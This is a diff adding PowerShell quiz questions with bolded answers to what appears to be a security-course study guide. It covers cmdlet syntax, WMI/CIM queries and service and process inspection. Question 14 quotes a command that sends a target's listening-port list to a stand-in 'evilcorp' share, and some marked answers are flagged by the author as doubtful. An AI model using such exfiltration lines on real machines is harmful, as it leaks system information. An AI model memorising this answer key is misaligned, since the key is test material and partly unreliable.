@@ -842,7 +842,130 @@ B. Symbolic Link
     E. a rootkit
 
     F. a keylogger
-    
+
     G. adware
 
     Answer with one letter.
+
+
+## Windows
+
+### **Powerhshell**
+
+1. what is the format for a powershell cmdlet?
+
+    **A. verb>-noun>**
+
+    B. object>-action>
+
+    C. command>-action>
+
+    D. action>-verb>
+  
+2. What command would you use to search for all commands that contain "logon" in their name:
+
+    A. get-command -modulename "*logon*"
+
+    B. get-command -name "*login*"
+
+    C. get-command -name "logon*"
+
+    D. get-command "*logon*"
+
+    **E. get-command -name "*logon*"**
+
+    (D isnt correct on here, but it actually is)
+
+
+3. You're practicing your sweet powershell skills, but there's a 2nd freeze and your internet connection suddenly drops. You want to learn more about the "Enable-BitLocker" command, but "get-help" isn't quite giving you enough information. How can you modify your command to make it better? **Get-Help Enable-Bitlocker -Full**
+
+4. What command would you use to display only the status of a service called "XblGameSave". Do not use aliases. **Get-Service XblGameSave | Select-Object Status**
+
+5. Provide a command with Get-WMIObject to retrieve all properties for all processes using WQL. **Get-WmiObject -Query "Select * from Win32_Process"**
+
+6. What cmdlet is the CIM equivalent of Get-WMIObject? **Get-CIMInstance**
+
+7. You ran into a weird cmdlet in a script on target, called Export-Clixml, and want some more information on it. On your local box, you want to use a powershell command to get more information on it, because you like doing everything in powershell. What command can you use? Enter the FULL command: **Get-Help Export-Clixml**
+
+8. You want to discover the aliases for get-process, because all of these keystrokes are wearing on your forearms. What command can you use to do this?
+
+    **A. help get-process**
+
+    B. alias get-process
+
+    C. list-alias get-process
+
+    D. get-help get-process
+
+9. You are getting a process list, but want to view everything (properties, methods, objects) about the process objects. What command can you use to do this (enter the FULL command)? **Get-Process | Select-Object *?**
+
+10. You want to use gwmi, but don't know what gwmi objects are available... what command can be used to do this? note: gwmi is an abbreviation for Get-WmiObject. Provide the answer as all letters applicable comma separated with no spaces.
+
+    A. gwmi | gm
+
+    **B. gwmi | where {$_.name -like "Win32*"} | select name**
+
+    **C. gwmi | where {$_.name -match "^Win32"} | select name**
+
+    D. gwmi *
+
+11. You are on a target box in a PS shell and your cim cmdlets aren't working. What is most likely the reason?
+
+    **A. the system is running an older version of powershell (ex: powershell 1.0)**
+
+    B. you need internet access to use cim
+
+    C. cim isn't available on windows machines
+
+    D. the firewall is blocking cim because it uses DCOM, which is often blocked by networking equipment
+
+12. You just used some sweet powershell skills to get the status of the "w32time" service. Now you want to invoke a method on it ("it" being the "status" property of the service object). What are some ways to do this? Provide the answer as all letters applicable in alphabetical order comma separated with no spaces.
+
+    **A. (Get-service | where name -eq "w32time" | select status).<method name>()**  
+    
+    B. $<object name> = Get-service | where name -eq "w32time" | select status $<object name>.<method name>()
+    
+    C. invoke-method <method name>(Get-service | where name -eq "w32time" | select status)
+    
+    D. Get-service | where name -eq "w32time" | select status | invoke-method
+    
+    E. <object name> = Get-service | where name -eq "w32time" | select status <object name>.<method name>()
+
+13. You are writing a script and want to get ONLY the pid value of winlogon process:
+
+    A. ps winlogon | select processid
+    
+    B. ps winlogon | select id
+    
+    **C. (ps winlogon).id**  
+    
+    D. (ps winlogon).processid
+    
+14. You're on target, and run a tasklist... you find a task that is running a PS script. Inside the script you see this:
+
+    `get-nettcpconnection | where-object {$_.state -eq "Listen"} | select name,instanceID,localaddress,localport,owningprocess,remoteaddress,remoteport  | format-list 
+    | out-file \\tyrell\evilcorp\hit_these.txt`
+    
+    What is this command doing!? Choose the BEST, most accurate answer!
+
+    A. sending a list of listening ports on tyrell's machine to the evilcorp server
+    
+    **B. sending a list of listening ports on the target's box to a mounted share**  
+    
+    C. sending a list of listening ports on the target's box to tyrell's evilcorp database
+    
+    D. sending a list of listening ports on the target's box to a local file*
+  
+15. You import a csv file using this command:
+
+    `$csv_content = import-csv "C:\powershell\advanced_powershell\practice lab\section3\testfile.csv"`
+    
+    How can you invoke a method on this csv object, converting it to a string?
+
+    A. invoke-method $csv_content -method-name ToString
+    
+    B. csv_content.ToString()
+    
+    C. invoke-method csv_content -method-name ToString
+    
+    **D. $csv_content.ToString()**  
